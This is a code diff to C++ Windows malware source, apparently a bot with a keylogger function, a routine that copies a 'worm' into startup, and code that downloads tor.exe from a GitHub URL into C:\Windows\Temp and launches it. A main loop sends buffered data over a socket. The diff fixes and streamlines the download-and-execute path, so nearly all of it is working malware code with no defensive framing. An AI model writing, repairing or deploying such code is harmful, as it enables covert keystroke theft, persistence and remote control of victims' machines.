@@ -287,12 +287,8 @@ void keylog()
 
 static void start_tor()
 {
-    //FILE *c_03 = popen("C:\\Windows\\Temp\\tor.exe", "r");
-    //(void)pclose(c_03);
-    //system("C:\\Windows\\Temp\\tor.exe");
     STARTUPINFO si{};
     PROCESS_INFORMATION pi{};
-
     si.cb = sizeof(si);
     CreateProcess(nullptr, (LPSTR)"C:\\Windows\\Temp\\tor.exe", nullptr, nullptr, false, 0, nullptr, nullptr, &si, &pi);
 }
@@ -326,14 +322,14 @@ void wget()
 
     FILE *fp;
 
-    hInet = InternetOpen("TEST", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    hInet = InternetOpen(TEXT("TEST"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 
-    hFile = InternetOpenUrl(hInet, "https://github.com/ware255/yuki/raw/main/bot/tor.exe", NULL, 0, 0, 0);
+    hFile = InternetOpenUrl(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), NULL, 0, 0, 0);
     if (hFile == NULL) return;
 
-    fopen_s(&fp, "tor.exe", "wb");
+    fopen_s(&fp, "C:\\Windows\\Temp\\tor.exe", "wb");
 
-    if (wget(hInet, "https://github.com/ware255/yuki/raw/main/bot/tor.exe", fp) < 0) return;
+    if (wget(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), fp) < 0) return;
 
     InternetCloseHandle(hFile);
     InternetCloseHandle(hInet);
@@ -349,10 +345,6 @@ void start_up(std::string str)
     FILE *c_01 = popen(cmd_copy_worm_startup_p, "r");
     (void)pclose(c_01);
     wget();
-    cmd_copy_worm_startup = "xcopy \".\\tor.exe\" C:\\Windows\\Temp\\tor.exe* /Y";
-    const char *cmd_copy_worm_startup_q = cmd_copy_worm_startup.c_str();
-    FILE *c_02 = popen(cmd_copy_worm_startup_q, "r");
-    (void)pclose(c_02);
 }
 
 int main(int argc, char **argv)
@@ -461,7 +453,6 @@ int main(int argc, char **argv)
             }
             send(Socket, send_buf, strlen(send_buf), 0);
             memset(send_buf, 0, MAX*sizeof(send_buf[0]));
-            send_buf[MAX] = {0};
         }
     }
 
